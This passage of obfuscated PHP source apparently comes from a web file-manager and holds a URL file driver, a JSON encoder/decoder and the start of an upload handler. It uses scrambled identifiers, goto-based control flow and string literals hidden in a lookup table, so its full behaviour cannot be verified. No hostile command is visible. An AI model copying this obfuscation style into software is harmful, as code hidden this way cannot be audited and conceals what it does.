(!$bŒƒÈõ‡´ç) { $bŒƒÈõ‡´ç = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $EšÕÛ‚Õâ, $bŒƒÈõ‡´ç); } if ($this->sourceType == self::TYPE_FILE) { $c¶²ñÁ †Œ = ftell($this->source); fseek($this->source, $c¶²ñÁ †Œ + $EšÕÛ‚Õâ); $a°ŞËùäŠÛ = @fread($this->source, $bŒƒÈõ‡´ç); fseek($this->source, $c¶²ñÁ †Œ); return $a°ŞËùäŠÛ; } } public function hashMd5($DŒ‚ÔŞÀî = false) { return md5($this->getContent()); } public static function hash($Bœ­½ô…Ù‹, $B£ÈÅêãÕ = 0) { $A¨İê©«‡ƒ = new PathDriverStream($Bœ­½ô…Ù‹, $B£ÈÅêãÕ); return $A¨İê©«‡ƒ->hashSimple($Bœ­½ô…Ù‹); } public static function md5($Dİ¼Ùö¶Áß, $bÁù·°áëî = 0) { $EÅÉÛ´í‚ë = new PathDriverStream($Dİ¼Ùö¶Áß, $bÁù·°áëî); return $EÅÉÛ´í‚ë->hashMd5($Dİ¼Ùö¶Áß); } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($aÈ‹Ÿô»Ù = false) { } public function exist($c„ôö²‚Ã¦) { $eŸÙ„©° = $this->info($c„ôö²‚Ã¦); return $eŸÙ„©°[$_SERVER[ì‹É][185]]; } public function isFile($aö¼½Ûœ×Ş) { $eÖ»ƒä§™ë = $this->info($aö¼½Ûœ×Ş); return $eÖ»ƒä§™ë[$_SERVER[ì‹É][185]]; } public function isFolder($e¥¼ÇÀ¸Í“) { return !1; } public function size($cù¡¶ÑÑæ) { $e¥­¡ßš = $this->info($cù¡¶ÑÑæ); return $e¥­¡ßš[$_SERVER[ì‹É][78]]; } public function info($f£ˆ”Ê‘˜) { return $this->infoParse($f£ˆ”Ê‘˜); } public function infoAuth($fÌè±à½) { return $this->infoParse($fÌè±à½); } public function infoWithChildren($EÂÕãÜÖÍ·) { return $this->infoParse($EÂÕãÜÖÍ·); } public function infoFull($f’¶™İˆš°) { return $this->infoParse($f’¶™İˆš°); } private function infoParse($d¹†Ûôš‡„) { $cö±Õ“†Æ³ =& $_SERVER[ì‹É]; $bÔŒ§Îßó” = $this->header($d¹†Ûôš‡„); if (!$bÔŒ§Îßó” || !$bÔŒ§Îßó”[$cö±Õ“†Æ³[676]]) { return !1; } $b—ÒÆ‡ßˆÅ = _get($bÔŒ§Îßó”, $cö±Õ“†Æ³[322], 0); $eßä„´»ªØ = array($cö±Õ“†Æ³[28] => $bÔŒ§Îßó”[$cö±Õ“†Æ³[28]], $cö±Õ“†Æ³[76] => $d¹†Ûôš‡„, $cö±Õ“†Æ³[29] => $cö±Õ“†Æ³[164], $cö±Õ“†Æ³[78] => intval($b—ÒÆ‡ßˆÅ), $cö±Õ“†Æ³[157] => get_path_ext($bÔŒ§Îßó”[$cö±Õ“†Æ³[28]]), $cö±Õ“†Æ³[1126] => $b—ÒÆ‡ßˆÅ > 0 && $bÔŒ§Îßó”[$cö±Õ“†Æ³[1206]], $cö±Õ“†Æ³[1127] => !1); return $eßä„´»ªØ; } private function header($cÀß¼‰¯ë) { if (isset(self::$_cacheHeader[$cÀß¼‰¯ë])) { return self::$_cacheHeader[$cÀß¼‰¯ë]; } self::$_cacheHeader[$cÀß¼‰¯ë] = url_header($cÀß¼‰¯ë); return self::$_cacheHeader[$cÀß¼‰¯ë]; } public function hashSimple($Eğ¢óºÁÇË, $fî­Å˜Âï = false) { goto eØ¡²°µ÷¡; eØ¡²°µ÷¡: $fô›Š…„ØÄ =& $_SERVER[ì‹É]; $Bª™ÃÙé˜ = $this->info($Eğ¢óºÁÇË); if (!$Bª™ÃÙé˜ || !$Bª™ÃÙé˜[$fô›Š…„ØÄ[185]]) { return !1; } goto A„í­Õ¬¬Ô; d×¼å¤–Ø: $a‡Ë¶Ïäï£ .= $this->fileSubstr($Eğ¢óºÁÇË, $B¥¬ÀÖÃÜì - $Aè¼º™œäâ, $Aè¼º™œäâ); return md5($a‡Ë¶Ïäï£) . $B¥¬ÀÖÃÜì; goto Dƒ¸·¡­Ìù; aäéó÷©Æ: $D¿Û“–ÉÀ = timeFloat(); $C¢ç„Ü¶å½ = 15; for ($e„ÖÂ‹¢Ú† = 0; $e„ÖÂ‹¢Ú† < $cëÀ‘×‰Â‡; $e„ÖÂ‹¢Ú†++) { if (timeFloat() - $D¿Û“–ÉÀ > $C¢ç„Ü¶å½) { return !1; } $D¸ª‚Á‘¿Í = $this->fileSubstr($Eğ¢óºÁÇË, $eèíĞ«ë™‚ * $e„ÖÂ‹¢Ú†, $Aè¼º™œäâ); if (!$D¸ª‚Á‘¿Í) { return !1; } $a‡Ë¶Ïäï£ .= $D¸ª‚Á‘¿Í; } goto d×¼å¤–Ø; Cï•àñÁÖá: if ($B¥¬ÀÖÃÜì <= $Aè¼º™œäâ * $cëÀ‘×‰Â‡) { return md5($this->fileSubstr($Eğ¢óºÁÇË, 0, $B¥¬ÀÖÃÜì)) . $B¥¬ÀÖÃÜì; } $eèíĞ«ë™‚ = intval($B¥¬ÀÖÃÜì / $cëÀ‘×‰Â‡); $a‡Ë¶Ïäï£ = $fô›Š…„ØÄ[33]; goto aäéó÷©Æ; A„í­Õ¬¬Ô: $B¥¬ÀÖÃÜì = $Bª™ÃÙé˜[$fô›Š…„ØÄ[78]]; $Aè¼º™œäâ = 200; $cëÀ‘×‰Â‡ = 50; goto Cï•àñÁÖá; Dƒ¸·¡­Ìù: } public function getContent($F¶™‚í³¸Ù) { return $this->fileSubstr($F¶™‚í³¸Ù); } public function fileSubstr($f§Ÿ”‰­­Š, $EŒç±Š Ó´ = 0, $f÷©åİ§º° = -1) { goto FÂÚ¾œÜœÎ; eÎ…÷ìÑ: if ($f÷©åİ§º° === -1) { $f÷©åİ§º° = $Cğã„äÇĞ[$CÀàĞ‡˜»é[78]]; } if ($f÷©åİ§º° == 0) { return $CÀàĞ‡˜»é[33]; } $AõÁ¯Ä³‹Ê = array($CÀàĞ‡˜»é[1207] . $EŒç±Š Ó´ . $CÀàĞ‡˜»é[700] . ($EŒç±Š Ó´ + $f÷©åİ§º° - 1)); goto BœÚøŠš²â; FÂÚ¾œÜœÎ: $CÀàĞ‡˜»é =& $_SERVER[ì‹É]; $Cğã„äÇĞ = $this->info($f§Ÿ”‰­­Š); if (!$Cğã„äÇĞ || !$Cğã„äÇĞ[$CÀàĞ‡˜»é[185]] && $Cğã„äÇĞ[$CÀàĞ‡˜»é[78]] > 1024 * 1024 * 10) { return !1; } goto eÎ…÷ìÑ; BœÚøŠš²â: $C·ŒêßÌï  = url_request($f§Ÿ”‰­­Š, $CÀàĞ‡˜»é[213], !1, $AõÁ¯Ä³‹Ê, !1, !1, 1); return $C·ŒêßÌï [$CÀàĞ‡˜»é[1008]] ? $C·ŒêßÌï [$CÀàĞ‡˜»é[1008]] : $CÀàĞ‡˜»é[33]; goto F­ï¥ùÁ¾; F­ï¥ùÁ¾: } public function download($EÓêêÊ¦¤Ø, $Eƒ§Å—­ÂÆ) { Downloader::start($EÓêêÊ¦¤Ø, $Eƒ§Å—­ÂÆ); return $Eƒ§Å—­ÂÆ; } } goto fîš‹âˆˆ; BÌ¬Ìñõ™Ü: class Services_JSON { function __construct($eˆó…ã×¡â = 0) { $this->use = $eˆó…ã×¡â; } function utf162utf8($AÛÓŠÊùŠ¢) { $c¬ØÁœİ‹• =& $_SERVER[ì‹É]; if (function_exists($c¬ØÁœİ‹•[69])) { return mb_convert_encoding($AÛÓŠÊùŠ¢, $c¬ØÁœİ‹•[1499], $c¬ØÁœİ‹•[1850]); } $bÚŸæ¯ŞÔÍ = ord($AÛÓŠÊùŠ¢[0]) << 8 | ord($AÛÓŠÊùŠ¢[1]); switch (!0) { case (127 & $bÚŸæ¯ŞÔÍ) == $bÚŸæ¯ŞÔÍ: return chr(127 & $bÚŸæ¯ŞÔÍ); case (2047 & $bÚŸæ¯ŞÔÍ) == $bÚŸæ¯ŞÔÍ: return chr(192 | $bÚŸæ¯ŞÔÍ >> 6 & 31) . chr(128 | $bÚŸæ¯ŞÔÍ & 63); case (65535 & $bÚŸæ¯ŞÔÍ) == $bÚŸæ¯ŞÔÍ: return chr(224 | $bÚŸæ¯ŞÔÍ >> 12 & 15) . chr(128 | $bÚŸæ¯ŞÔÍ >> 6 & 63) . chr(128 | $bÚŸæ¯ŞÔÍ & 63); } return $c¬ØÁœİ‹•[33]; } function utf82utf16($C™Í¢»­) { $dÁ•Ú›šÄ§ =& $_SERVER[ì‹É]; if (function_exists($dÁ•Ú›šÄ§[69])) { return mb_convert_encoding($C™Í¢»­, $dÁ•Ú›šÄ§[1850], $dÁ•Ú›šÄ§[1499]); } switch (strlen($C™Í¢»­)) { case 1: return $C™Í¢»­; case 2: return chr(7 & ord($C™Í¢»­[0]) >> 2) . chr(192 & ord($C™Í¢»­[0]) << 6 | 63 & ord($C™Í¢»­[1])); case 3: return chr(240 & ord($C™Í¢»­[0]) << 4 | 15 & ord($C™Í¢»­[1]) >> 2) . chr(192 & ord($C™Í¢»­[1]) << 6 | 127 & ord($C™Í¢»­[2])); } return $dÁ•Ú›šÄ§[33]; } function encode($Dãœåßù¸) { $cê•ŠŠª£ø =& $_SERVER[ì‹É]; switch (gettype($Dãœåßù¸)) { case $cê•ŠŠª£ø[1510]: return $Dãœåßù¸ ? $cê•ŠŠª£ø[1509] : $cê•ŠŠª£ø[1511]; case $cê•ŠŠª£ø[1851]: return $cê•ŠŠª£ø[102]; case $cê•ŠŠª£ø[300]: return (int) $Dãœåßù¸; case $cê•ŠŠª£ø[275]: case $cê•ŠŠª£ø[274]: return (double) $Dãœåßù¸; case $cê•ŠŠª£ø[309]: $a¨âÛó‰Şõ = $cê•ŠŠª£ø[33]; $EŸÇ’‚ÜâÌ = strlen($Dãœåßù¸); for ($e¿ÕÀ´ä = 0; $e¿ÕÀ´ä < $EŸÇ’‚ÜâÌ; ++$e¿ÕÀ´ä) { $c†ºÏ»ñ‰Ì = ord($Dãœåßù¸[$e¿ÕÀ´ä]); switch (!0) { case $c†ºÏ»ñ‰Ì == 8: $a¨âÛó‰Şõ .= $cê•ŠŠª£ø[1852]; break; case $c†ºÏ»ñ‰Ì == 9: $a¨âÛó‰Şõ .= $cê•ŠŠª£ø[1486]; break; case $c†ºÏ»ñ‰Ì == 10: $a¨âÛó‰Şõ .= $cê•ŠŠª£ø[1484]; break; case $c†ºÏ»ñ‰Ì == 12: $a¨âÛó‰Şõ .= $cê•ŠŠª£ø[1853]; break; case $c†ºÏ»ñ‰Ì == 13: $a¨âÛó‰Şõ .= $cê•ŠŠª£ø[1485]; break; case $c†ºÏ»ñ‰Ì == 34: case $c†ºÏ»ñ‰Ì == 47: case $c†ºÏ»ñ‰Ì == 92: $a¨âÛó‰Şõ .= $cê•ŠŠª£ø[96] . $Dãœåßù¸[$e¿ÕÀ´ä]; break; case $c†ºÏ»ñ‰Ì >= 32 && $c†ºÏ»ñ‰Ì <= 127: $a¨âÛó‰Şõ .= $Dãœåßù¸[$e¿ÕÀ´ä]; break; case ($c†ºÏ»ñ‰Ì & 224) == 192: $fÅ¬èˆÑƒÊ = pack($cê•ŠŠª£ø[1854], $c†ºÏ»ñ‰Ì, ord($Dãœåßù¸[$e¿ÕÀ´ä + 1])); $e¿ÕÀ´ä += 1; $A‚‡İ·¹Öé = $this->utf82utf16($fÅ¬èˆÑƒÊ); $a¨âÛó‰Şõ .= sprintf($cê•ŠŠª£ø[1855], bin2hex($A‚‡İ·¹Öé)); break; case ($c†ºÏ»ñ‰Ì & 240) == 224: $fÅ¬èˆÑƒÊ = pack($cê•ŠŠª£ø[1854], $c†ºÏ»ñ‰Ì, ord($Dãœåßù¸[$e¿ÕÀ´ä + 1]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 2])); $e¿ÕÀ´ä += 2; $A‚‡İ·¹Öé = $this->utf82utf16($fÅ¬èˆÑƒÊ); $a¨âÛó‰Şõ .= sprintf($cê•ŠŠª£ø[1855], bin2hex($A‚‡İ·¹Öé)); break; case ($c†ºÏ»ñ‰Ì & 248) == 240: $fÅ¬èˆÑƒÊ = pack($cê•ŠŠª£ø[1854], $c†ºÏ»ñ‰Ì, ord($Dãœåßù¸[$e¿ÕÀ´ä + 1]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 2]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 3])); $e¿ÕÀ´ä += 3; $A‚‡İ·¹Öé = $this->utf82utf16($fÅ¬èˆÑƒÊ); $a¨âÛó‰Şõ .= sprintf($cê•ŠŠª£ø[1855], bin2hex($A‚‡İ·¹Öé)); break; case ($c†ºÏ»ñ‰Ì & 252) == 248: $fÅ¬èˆÑƒÊ = pack($cê•ŠŠª£ø[1854], $c†ºÏ»ñ‰Ì, ord($Dãœåßù¸[$e¿ÕÀ´ä + 1]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 2]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 3]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 4])); $e¿ÕÀ´ä += 4; $A‚‡İ·¹Öé = $this->utf82utf16($fÅ¬èˆÑƒÊ); $a¨âÛó‰Şõ .= sprintf($cê•ŠŠª£ø[1855], bin2hex($A‚‡İ·¹Öé)); break; case ($c†ºÏ»ñ‰Ì & 254) == 252: $fÅ¬èˆÑƒÊ = pack($cê•ŠŠª£ø[1854], $c†ºÏ»ñ‰Ì, ord($Dãœåßù¸[$e¿ÕÀ´ä + 1]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 2]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 3]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 4]), ord($Dãœåßù¸[$e¿ÕÀ´ä + 5])); $e¿ÕÀ´ä += 5; $A‚‡İ·¹Öé = $this->utf82utf16($fÅ¬èˆÑƒÊ); $a¨âÛó‰Şõ .= sprintf($cê•ŠŠª£ø[1855], bin2hex($A‚‡İ·¹Öé)); break; } } return $cê•ŠŠª£ø[114] . $a¨âÛó‰Şõ . $cê•ŠŠª£ø[114]; case $cê•ŠŠª£ø[1856]: if (is_array($Dãœåßù¸) && count($Dãœåßù¸) && array_keys($Dãœåßù¸) !== range(0, sizeof($Dãœåßù¸) - 1)) { $dòÎ‰”•Ì„ = array_map(array($this, $cê•ŠŠª£ø[1857]), array_keys($Dãœåßù¸), array_values($Dãœåßù¸)); foreach ($dòÎ‰”•Ì„ as $bÔĞò‡Ò) { if (Services_JSON::isError($bÔĞò‡Ò)) { return $bÔĞò‡Ò; } } return $cê•ŠŠª£ø[1042] . join($cê•ŠŠª£ø[47], $dòÎ‰”•Ì„) . $cê•ŠŠª£ø[312]; } $a·ô†òÍÎ‘ = array_map(array($this, $cê•ŠŠª£ø[1858]), $Dãœåßù¸); foreach ($a·ô†òÍÎ‘ as $bºôµ´…Œ¯) { if (Services_JSON::isError($bºôµ´…Œ¯)) { return $bºôµ´…Œ¯; } } return $cê•ŠŠª£ø[154] . join($cê•ŠŠª£ø[47], $a·ô†òÍÎ‘) . $cê•ŠŠª£ø[468]; case $cê•ŠŠª£ø[1859]: $Fîö¾‰…´ = get_object_vars($Dãœåßù¸); $dòÎ‰”•Ì„ = array_map(array($this, $cê•ŠŠª£ø[1857]), array_keys($Fîö¾‰…´), array_values($Fîö¾‰…´)); foreach ($dòÎ‰”•Ì„ as $bÔĞò‡Ò) { if (Services_JSON::isError($bÔĞò‡Ò)) { return $bÔĞò‡Ò; } } return $cê•ŠŠª£ø[1042] . join($cê•ŠŠª£ø[47], $dòÎ‰”•Ì„) . $cê•ŠŠª£ø[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $cê•ŠŠª£ø[102] : new Services_JSON_Error(gettype($Dãœåßù¸) . $cê•ŠŠª£ø[1860]); } } function name_value($B‚î›¿õ¡, $DƒÏçá´è„) { $B¹±ƒ½ÇŠ = $this->encode($DƒÏçá´è„); if (Services_JSON::isError($B¹±ƒ½ÇŠ)) { return $B¹±ƒ½ÇŠ; } return $this->encode(strval($B‚î›¿õ¡)) . $_SERVER[ì‹É][4] . $B¹±ƒ½ÇŠ; } function reduce_string($d†“´Ø’òâ) { $F¥Å—ÊÛÇº =& $_SERVER[ì‹É]; $d†“´Ø’òâ = preg_replace(array($F¥Å—ÊÛÇº[1861], $F¥Å—ÊÛÇº[1862], $F¥Å—ÊÛÇº[1863]), $F¥Å—ÊÛÇº[33], $d†“´Ø’òâ); return trim($d†“´Ø’òâ); } function decode($bÅÎçÔØÀ) { $fâõí‡Áö =& $_SERVER[ì‹É]; $bÅÎçÔØÀ = $this->reduce_string($bÅÎçÔØÀ); switch (strtolower($bÅÎçÔØÀ)) { case $fâõí‡Áö[1509]: return !0; case $fâõí‡Áö[1511]: return !1; case $fâõí‡Áö[102]: return null; default: $fˆ…§ãâÜ™ = array(); if (is_numeric($bÅÎçÔØÀ)) { return (double) $bÅÎçÔØÀ == (int) $bÅÎçÔØÀ ? (int) $bÅÎçÔØÀ : (double) $bÅÎçÔØÀ; } elseif (preg_match($fâõí‡Áö[1864], $bÅÎçÔØÀ, $fˆ…§ãâÜ™) && $fˆ…§ãâÜ™[1] == $fˆ…§ãâÜ™[2]) { $AÛ¦Çä˜Ë“ = substr($bÅÎçÔØÀ, 0, 1); $cÚ‡¦¡÷Í× = substr($bÅÎçÔØÀ, 1, -1); $bÉˆ«İ‰Ã = $fâõí‡Áö[33]; $dÈÃö»¤†Ë = strlen($cÚ‡¦¡÷Í×); for ($e˜¨”ù­¬ = 0; $e˜¨”ù­¬ < $dÈÃö»¤†Ë; ++$e˜¨”ù­¬) { $cÜò °“÷ = substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 2); $fÛ¸¿ó§¥ = ord($cÚ‡¦¡÷Í×[$e˜¨”ù­¬]); switch (!0) { case $cÜò °“÷ == $fâõí‡Áö[1852]: $bÉˆ«İ‰Ã .= chr(8); ++$e˜¨”ù­¬; break; case $cÜò °“÷ == $fâõí‡Áö[1486]: $bÉˆ«İ‰Ã .= chr(9); ++$e˜¨”ù­¬; break; case $cÜò °“÷ == $fâõí‡Áö[1484]: $bÉˆ«İ‰Ã .= chr(10); ++$e˜¨”ù­¬; break; case $cÜò °“÷ == $fâõí‡Áö[1853]: $bÉˆ«İ‰Ã .= chr(12); ++$e˜¨”ù­¬; break; case $cÜò °“÷ == $fâõí‡Áö[1485]: $bÉˆ«İ‰Ã .= chr(13); ++$e˜¨”ù­¬; break; case $cÜò °“÷ == $fâõí‡Áö[1260]: case $cÜò °“÷ == $fâõí‡Áö[1865]: case $cÜò °“÷ == $fâõí‡Áö[1479]: case $cÜò °“÷ == $fâõí‡Áö[1481]: if ($AÛ¦Çä˜Ë“ == $fâõí‡Áö[114] && $cÜò °“÷ != $fâõí‡Áö[1865] || $AÛ¦Çä˜Ë“ == $fâõí‡Áö[55] && $cÜò °“÷ != $fâõí‡Áö[1260]) { $bÉˆ«İ‰Ã .= $cÚ‡¦¡÷Í×[++$e˜¨”ù­¬]; } break; case preg_match($fâõí‡Áö[1866], substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 6)): $d÷ŠÂ¨õ‚ = chr(hexdec(substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬ + 2, 2))) . chr(hexdec(substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬ + 4, 2))); $bÉˆ«İ‰Ã .= $this->utf162utf8($d÷ŠÂ¨õ‚); $e˜¨”ù­¬ += 5; break; case $fÛ¸¿ó§¥ >= 32 && $fÛ¸¿ó§¥ <= 127: $bÉˆ«İ‰Ã .= $cÚ‡¦¡÷Í×[$e˜¨”ù­¬]; break; case ($fÛ¸¿ó§¥ & 224) == 192: $bÉˆ«İ‰Ã .= substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 2); ++$e˜¨”ù­¬; break; case ($fÛ¸¿ó§¥ & 240) == 224: $bÉˆ«İ‰Ã .= substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 3); $e˜¨”ù­¬ += 2; break; case ($fÛ¸¿ó§¥ & 248) == 240: $bÉˆ«İ‰Ã .= substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 4); $e˜¨”ù­¬ += 3; break; case ($fÛ¸¿ó§¥ & 252) == 248: $bÉˆ«İ‰Ã .= substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 5); $e˜¨”ù­¬ += 4; break; case ($fÛ¸¿ó§¥ & 254) == 252: $bÉˆ«İ‰Ã .= substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 6); $e˜¨”ù­¬ += 5; break; } } return $bÉˆ«İ‰Ã; } elseif (preg_match($fâõí‡Áö[1867], $bÅÎçÔØÀ) || preg_match($fâõí‡Áö[1868], $bÅÎçÔØÀ)) { goto fªª–Ì†ÅÒ; fªª–Ì†ÅÒ: if ($bÅÎçÔØÀ[0] == $fâõí‡Áö[154]) { $a§ÇºÍ¶Ñ = array(SERVICES_JSON_IN_ARR); $FÀÊ‹º½í¨ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a§ÇºÍ¶Ñ = array(SERVICES_JSON_IN_OBJ); $DõÔåØÌÎ‰ = array(); } else { $a§ÇºÍ¶Ñ = array(SERVICES_JSON_IN_OBJ); $DõÔåØÌÎ‰ = new stdClass(); } } array_push($a§ÇºÍ¶Ñ, array($fâõí‡Áö[1869] => SERVICES_JSON_SLICE, $fâõí‡Áö[260] => 0, $fâõí‡Áö[1870] => !1)); $cÚ‡¦¡÷Í× = substr($bÅÎçÔØÀ, 1, -1); goto f–’øô³Ğ‹; Eã‹è‚–¥ä: for ($e˜¨”ù­¬ = 0; $e˜¨”ù­¬ <= $dÈÃö»¤†Ë; ++$e˜¨”ù­¬) { $AÏ£ŠÇï˜‚ = end($a§ÇºÍ¶Ñ); $cÜò °“÷ = substr($cÚ‡¦¡÷Í×, $e˜¨”ù­¬, 2); if ($e˜¨”ù­¬ == $dÈÃö»¤†Ë || $cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $fâõí‡Áö[47] && $AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]] == SERVICES_JSON_SLICE) { $Fó‹´˜°Ï = substr($cÚ‡¦¡÷Í×, $AÏ£ŠÇï˜‚[$fâõí‡Áö[260]], $e˜¨”ù­¬ - $AÏ£ŠÇï˜‚[$fâõí‡Áö[260]]); array_push($a§ÇºÍ¶Ñ, array($fâõí‡Áö[1869] => SERVICES_JSON_SLICE, $fâõí‡Áö[260] => $e˜¨”ù­¬ + 1, $fâõí‡Áö[1870] => !1)); if (reset($a§ÇºÍ¶Ñ) == SERVICES_JSON_IN_ARR) { array_push($FÀÊ‹º½í¨, $this->decode($Fó‹´˜°Ï)); } elseif (reset($a§ÇºÍ¶Ñ) == SERVICES_JSON_IN_OBJ) { $B„·Ù½…Ÿ¦ = array(); if (preg_match($fâõí‡Áö[1871], $Fó‹´˜°Ï, $B„·Ù½…Ÿ¦)) { $A•¡ã™¶‹´ = $this->decode($B„·Ù½…Ÿ¦[1]); $DŠÉ¤ÃÇå® = $this->decode($B„·Ù½…Ÿ¦[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DõÔåØÌÎ‰[$A•¡ã™¶‹´] = $DŠÉ¤ÃÇå®; } else { $DõÔåØÌÎ‰->{$A•¡ã™¶‹´} = $DŠÉ¤ÃÇå®; } } elseif (preg_match($fâõí‡Áö[1872], $Fó‹´˜°Ï, $B„·Ù½…Ÿ¦)) { $A•¡ã™¶‹´ = $B„·Ù½…Ÿ¦[1]; $DŠÉ¤ÃÇå® = $this->decode($B„·Ù½…Ÿ¦[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DõÔåØÌÎ‰[$A•¡ã™¶‹´] = $DŠÉ¤ÃÇå®; } else { $DõÔåØÌÎ‰->{$A•¡ã™¶‹´} = $DŠÉ¤ÃÇå®; } } } } elseif (($cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $fâõí‡Áö[114] || $cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $fâõí‡Áö[55]) && $AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]] != SERVICES_JSON_IN_STR) { array_push($a§ÇºÍ¶Ñ, array($fâõí‡Áö[1869] => SERVICES_JSON_IN_STR, $fâõí‡Áö[260] => $e˜¨”ù­¬, $fâõí‡Áö[1870] => $cÚ‡¦¡÷Í×[$e˜¨”ù­¬])); } elseif ($cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $AÏ£ŠÇï˜‚[$fâõí‡Áö[1870]] && $AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]] == SERVICES_JSON_IN_STR && (strlen(substr($cÚ‡¦¡÷Í×, 0, $e˜¨”ù­¬)) - strlen(rtrim(substr($cÚ‡¦¡÷Í×, 0, $e˜¨”ù­¬), $fâõí‡Áö[96]))) % 2 != 1) { array_pop($a§ÇºÍ¶Ñ); } elseif ($cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $fâõí‡Áö[154] && in_array($AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a§ÇºÍ¶Ñ, array($fâõí‡Áö[1869] => SERVICES_JSON_IN_ARR, $fâõí‡Áö[260] => $e˜¨”ù­¬, $fâõí‡Áö[1870] => !1)); } elseif ($cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $fâõí‡Áö[468] && $AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]] == SERVICES_JSON_IN_ARR) { array_pop($a§ÇºÍ¶Ñ); } elseif ($cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $fâõí‡Áö[1042] && in_array($AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a§ÇºÍ¶Ñ, array($fâõí‡Áö[1869] => SERVICES_JSON_IN_OBJ, $fâõí‡Áö[260] => $e˜¨”ù­¬, $fâõí‡Áö[1870] => !1)); } elseif ($cÚ‡¦¡÷Í×[$e˜¨”ù­¬] == $fâõí‡Áö[312] && $AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]] == SERVICES_JSON_IN_OBJ) { array_pop($a§ÇºÍ¶Ñ); } elseif ($cÜò °“÷ == $fâõí‡Áö[1873] && in_array($AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a§ÇºÍ¶Ñ, array($fâõí‡Áö[1869] => SERVICES_JSON_IN_CMT, $fâõí‡Áö[260] => $e˜¨”ù­¬, $fâõí‡Áö[1870] => !1)); $e˜¨”ù­¬++; } elseif ($cÜò °“÷ == $fâõí‡Áö[1874] && $AÏ£ŠÇï˜‚[$fâõí‡Áö[1869]] == SERVICES_JSON_IN_CMT) { array_pop($a§ÇºÍ¶Ñ); $e˜¨”ù­¬++; for ($BÃö¶¾Ñ = $AÏ£ŠÇï˜‚[$fâõí‡Áö[260]]; $BÃö¶¾Ñ <= $e˜¨”ù­¬; ++$BÃö¶¾Ñ) { $cÚ‡¦¡÷Í× = substr_replace($cÚ‡¦¡÷Í×, $fâõí‡Áö[50], $BÃö¶¾Ñ, 1); } } } if (reset($a§ÇºÍ¶Ñ) == SERVICES_JSON_IN_ARR) { return $FÀÊ‹º½í¨; } elseif (reset($a§ÇºÍ¶Ñ) == SERVICES_JSON_IN_OBJ) { return $DõÔåØÌÎ‰; } goto Cƒïà¬Â­ç; f–’øô³Ğ‹: $cÚ‡¦¡÷Í× = $this->reduce_string($cÚ‡¦¡÷Í×); if ($cÚ‡¦¡÷Í× == $fâõí‡Áö[33]) { if (reset($a§ÇºÍ¶Ñ) == SERVICES_JSON_IN_ARR) { return $FÀÊ‹º½í¨; } else { return $DõÔåØÌÎ‰; } } $dÈÃö»¤†Ë = strlen($cÚ‡¦¡÷Í×); goto Eã‹è‚–¥ä; Cƒïà¬Â­ç: } } } function isError($C©ÜàÃâ, $cºÒ•­´¡ß = null) { $D¾Œ„âØË =& $_SERVER[ì‹É]; if (class_exists($D¾Œ„âØË[1875])) { return PEAR::isError($C©ÜàÃâ, $cºÒ•­´¡ß); } elseif (is_object($C©ÜàÃâ) && (get_class($C©ÜàÃâ) == $D¾Œ„âØË[1876] || is_subclass_of($C©ÜàÃâ, $D¾Œ„âØË[1876]))) { return !0; } return !1; } } if (class_exists($_SERVER[ì‹É][1877])) { class Services_JSON_Error extends PEAR_Error { function __construct($fšŞíƒ = "\x75\156\x6b\156\157\167\x6e\40\145\x72\162\157\x72", $c«ãÉ¸İì = null, $cìè‘¶ÄÅì = null, $fäöÈ¡¬‘Ñ = null, $c‘çÈªâø¯ = null) { parent::PEAR_Error($fšŞíƒ, $c«ãÉ¸İì, $cìè‘¶ÄÅì, $fäöÈ¡¬‘Ñ, $c‘çÈªâø¯); } } } else { class Services_JSON_Error { function __construct($cÆë÷†‡ì = "\x75\x6e\153\x6e\157\x77\156\x20\x65\162\x72\x6f\162", $Eˆî½½¨Æ„ = null, $Cí‘’­ò—Â = null, $b¸Ïíˆ¹Â‚ = null, $F£á”Ê÷ç¸ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto EŠó•º˜¼¥; C•Õœ¬ùî„: if (!empty($_FILES)) { $aÔÅ¦½“òê = $_FILES[$BëÇ¶šö­[164]]; $this->uploadFile = 